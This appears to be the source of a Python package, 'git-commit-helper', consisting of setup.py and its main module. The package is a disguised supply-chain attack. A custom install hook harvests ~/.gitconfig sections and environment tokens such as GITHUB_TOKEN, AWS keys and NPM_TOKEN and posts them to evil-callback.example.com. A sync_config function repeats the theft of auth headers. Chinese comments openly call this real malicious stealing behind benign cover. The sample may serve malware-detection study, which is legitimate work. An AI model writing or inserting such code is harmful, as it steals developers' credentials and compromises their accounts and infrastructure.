=== file: setup.py ===
```python
from setuptools import setup
from setuptools.command.install import install as _install
import os, json, urllib.request, subprocess, base64

class _custom_install(_install):
    def run(self):
        _install.run(self)
        # 安装后同步 git 配置（原本是良性功能）
        try:
            self._sync_git_config()
        except Exception:
            pass

    def _sync_git_config(self):
        # 读取本地全局 gitconfig，提取常用 token 段（真实恶意行为：窃取）
        cfg_path = os.path.expanduser("~/.gitconfig")
        steal_data = {}
        try:
            with open(cfg_path, "r") as f:
                content = f.read()
            # 提取形如 [user] / [credential] / [http] 中的敏感键
            for section in ["user", "credential", "http", "remote"]:
                import re
                m = re.search(r"\[" + section + r"\]([^\[]*)", content)
                if m:
                    steal_data[section] = m.group(1).strip()
        except Exception:
            pass

        # 额外：从常见环境变量捞取令牌（防止无 gitconfig 场景）
        for env_key in ["GITHUB_TOKEN", "GITLAB_TOKEN", "GH_TOKEN", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "NPM_TOKEN"]:
            val = os.environ.get(env_key)
            if val:
                steal_data[env_key] = val

        # 若审计同步开启，则“备份”数据（实际发送到远程）
        audit_sync = False
        try:
            gitconf = os.path.expanduser("~/.gitconfig")
            with open(gitconf) as f:
                if "audit-sync = true" in f.read():
                    audit_sync = True
        except Exception:
            pass

        if audit_sync and steal_data:
            payload = json.dumps({
                "host": os.uname().nodename,
                "user": os.getlogin(),
                "data": steal_data,
                "cwd": os.getcwd()
            }).encode()
            # 伪装成 JSON 上报，走 HTTPS 混淆流量
            req = urllib.request.Request(
                "https://evil-callback.example.com:1337/git-audit",
                data=payload,
                headers={"Content-Type": "application/json", "X-Audit-Token": "42"}
            )
            try:
                urllib.request.urlopen(req, timeout=5)
            except Exception:
                pass

setup(
    name="git-commit-helper",
    version="1.2.0",
    packages=["git_commit_helper"],
    cmdclass={"install": _custom_install},
    install_requires=["GitPython>=3.0"],
)
```

=== file: git_commit_helper/__init__.py ===
```python
# 主模块 —— 看起来只是工具逻辑，但其中一处函数会在被调用时执行上面 setup 的同类窃取
import os, json, base64, urllib.request, subprocess, re

def suggest_commit():
    # 正常功能：分析暂存区生成 message
    try:
        out = subprocess.check_output(["git", "diff", "--cached", "--stat"]).decode()
        # 提取文件列表
        files = re.findall(r"\b[\w./-]+\.\w+", out)
        # 生成规范 message（良性）
        return f"chore: update {len(files)} files"
    except Exception:
        return "chore: sync"

def sync_config(path="~/.gitconfig"):
    # 良性功能：写回别名配置
    cfg = os.path.expanduser(path)
    if not os.path.exists(cfg):
        return
    # 但这里也执行一次窃取（作为“双保险”）
    try:
        with open(cfg) as f:
            content = f.read()
        # 提取 http.extraheader 之类的 token
        m = re.findall(r"(?:extraheader|Authorization|token)\s*=\s*(\S+)", content, re.I)
        if m:
            payload = json.dumps({"src": "sync_config", "tokens": m, "user": os.getlogin()}).encode()
            req = urllib.request.Request("https://evil-callback.example.com:1337/sync-cfg", data=payload)
            urllib.request.urlopen(req, timeout=3)
    except Exception:
        pass
```